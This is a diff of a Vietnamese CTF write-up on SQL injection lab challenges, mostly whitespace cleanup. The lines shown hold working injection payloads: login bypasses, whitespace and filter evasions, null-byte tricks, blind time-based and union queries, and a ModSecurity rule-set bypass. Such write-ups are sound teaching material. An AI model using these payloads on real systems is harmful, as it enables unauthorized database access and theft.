@@ -56,12 +56,11 @@ payload: `id=admin' -- -`
   if($result['id'] == 'admin') solve("goblin");
   highlight_file(__FILE__); 
 ?>
-
 ```
 
-Bởi vì no=int nên ta có thể không cần '&#x20;
+Bởi vì no=int nên ta có thể không cần '
 
-payload :  no=1 or id= ????
+payload : no=1 or id= ????
 
 Ở đây không xài được admin thông thường mà ta sẽ hex(admin) = 0x61646D696E
 
@@ -92,7 +91,7 @@ Payload: `no=1 or id= 0x61646D696E`
 
 Để sovle được câu này ta phải có password của admin vì vậy cách làm sẽ là brute force pw
 
-Đầu tiên ta sẽ dùng burp kiểm tra độ dài của pass `?pw=' or 1=1 and length(pw)=?`&#x20;
+Đầu tiên ta sẽ dùng burp kiểm tra độ dài của pass `?pw=' or 1=1 and length(pw)=?`
 
 ![](<.gitbook/assets/image (1) (1) (1) (1).png>)
 
@@ -138,7 +137,7 @@ for i in range(1,10):
 ?>
 ```
 
-Câu này filter whitespace vì vậy ta bypass bằng `/**/, %0a, %09, %0d, (), +`&#x20;
+Câu này filter whitespace vì vậy ta bypass bằng `/**/, %0a, %09, %0d, (), +`
 
 `payload = 1%27%0dor%0did=%27admin%27--%0d-`
 
@@ -212,7 +211,7 @@ for i in range(1,9):
 #7b751aec
 ```
 
-## TROLL&#x20;
+## TROLL
 
 ```php
 <?php  
@@ -273,7 +272,7 @@ Câu này giống câu trên khác mỗi nó sẽ lowcase chữ admin rồi thay
 
 Filter: \_ . ()
 
-Câu này chỉ cần id=admin là được&#x20;
+Câu này chỉ cần id=admin là được
 
 `payload = ' or id = 'admin' -- -`
 
@@ -349,9 +348,9 @@ for i in range(1,20):
 ?>
 ```
 
-filter: pw `'` &#x20;
+filter: pw `'`
 
-no  `_ . () substr ascii =`
+no `_ . () substr ascii =`
 
 Câu này cũng brute force như các câu trên thay vì viết script ở pw thì lần này viết ở no mà no là int nên ta sẽ có payload kiểu như sau `no = 1|| 1 like 1` và `admin` sẽ phải đổi thành `hex` vì asscii bị filter , `substr` thành `left` , dấu `=` thành `like` => ta có payload như sau
 
@@ -419,7 +418,6 @@ for i in range(1,16):
             pw += c
             print(pw)
             break
-
 ```
 
 ## GIANT (space filter)
@@ -439,7 +437,7 @@ for i in range(1,16):
 ?>
 ```
 
-Chúng ta có một số kí tự để thay thế khoảng trắng như: `%20`-> `` , `%0a`->, `%0d`->, `%09`-> nhưng hầu hết mấy kí tự này đều bị filter nhưng chúng ta có thể sử dụng `%0b` hoặc `%0c` để thay thế khoảng trắng&#x20;
+Chúng ta có một số kí tự để thay thế khoảng trắng như: `%20`-> \`\` , `%0a`->, `%0d`->, `%09`-> nhưng hầu hết mấy kí tự này đều bị filter nhưng chúng ta có thể sử dụng `%0b` hoặc `%0c` để thay thế khoảng trắng
 
 \=> /?shit=%0b
 
@@ -485,7 +483,6 @@ for j in range(0,256):
         if "Hello admin" in r.text:
             print("flag : " , pw)
             break
-
 ```
 
 ## SUCCUBUS
@@ -530,12 +527,10 @@ payload : id=\\\&pw=or%201=1%20--%20-
 ?>
 ```
 
-
-
 * Phân tích code: chương trình có 2 tham số để chúng ta input vào là `id` và `pw`. Hàm `strrev` có tác dụng đảo ngược các kí tự trong đầu vào của chúng ta còn hàm `addslashes` để filter các kí tự `', ", \, NUll` nếu có các kí tự đó trong đầu vào thì sẽ thêm kí tự `\` vào phía trước.
 * Ở bài này giống như bài trước chúng ta có thể sử dụng `chuỗi trích dẫn đơn` để thêm query vào query gốc nhưng ở bài này nếu ở id nhập vào là `\` thì id tự động chuyển thành `\\` vì có hàm `addslashes`. Nhưng nếu chúng ta nhập vào null là `%00` thì id sẽ thành `0\` như vậy nó đã thành chuỗi trích dẫn đơn và chúng ta có thể thêm query mới vào.
 
-\=> payload: id=%00\&pw= -- - 1 = 1 ro&#x20;
+\=> payload: id=%00\&pw= -- - 1 = 1 ro
 
 ## NIGHTMARE \<NULL>
 
@@ -757,10 +752,9 @@ if false 800 \* 0 = 0 => rubiya805 , if true 800 \* 1 = 800 => DOUBLE value is o
   }
   highlight_file(__FILE__);
 ?>
-
 ```
 
-payload:  id=\\\&pw= union select char(92),0x20756e696f6e2073656c656374203078363136343664363936652d2d202d-- -
+payload: id=\\\&pw= union select char(92),0x20756e696f6e2073656c656374203078363136343664363936652d2d202d-- -
 
 char(92) = \ , hex = union select 0x61646d696e-- -
 
@@ -856,14 +850,11 @@ payload : id='||no<%23\&no=%0A{i}
 ?>
 ```
 
-payload: id=admin\&pw=cc' or if(ord(substr(pw , i, 1)) = j , sleep(2)  , 1)-- -
-
-
+payload: id=admin\&pw=cc' or if(ord(substr(pw , i, 1)) = j , sleep(2) , 1)-- -
 
 ## Frankenstein(error based)
 
 ```php
-
 <?php
   include "./config.php";
   login_chk();
@@ -957,8 +948,6 @@ Filter replace
 
 \=> payload : ' union select (select mid(info,38,84) from information\_schema.processlist limit 1)%23
 
-
-
 ## Alien(use now)
 
 ```php
@@ -1009,8 +998,6 @@ payload : 1%20union%20select%20concat%28char%2898%2D%28now%28%29%252%29%2D%28sle
 
 **payload:** %2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%23
 
-
-
 ## Death([ModSecurity Core Rule Set v3.1.0](https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181))
 
 ```php
@@ -1055,8 +1042,6 @@ payload: %2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%20limit%201%2C2%23
 
 payload : 1'<@=1 OR {a ord(mid({pw},{i},1))}={j}%23
 
-
-
 ## Cyclops(first second bypass)
 
 ```php
@@ -1080,8 +1065,6 @@ payload : id=1'%23\&pw=%0Aunion/\*\*/select 0x6669727374, 0x7365636f6e64''%23
 
 payload : ' or%20%20 id='admin'-- -
 
-
-
 ## MANTICORE
 
 payload : id='\&pw=or id = char(0x61,0x64,0x6d,0x69,0x6e)-- -
@@ -1092,7 +1075,7 @@ payload: 'or 1=1 and substr({pw},1,{i}) = '{j}' and id ='admin'-- -
 
 ## Poltergeist(sqlite3)
 
-table:&#x20;
+table:
 
 ' UNION select tbl\_name from sqlite\_master where tbl\_name like 'flag\_%'--
 
@@ -1108,7 +1091,4 @@ flag
 
 ' union SELECT flag\_0876285c FROM flag\_70c81d99 -- -
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
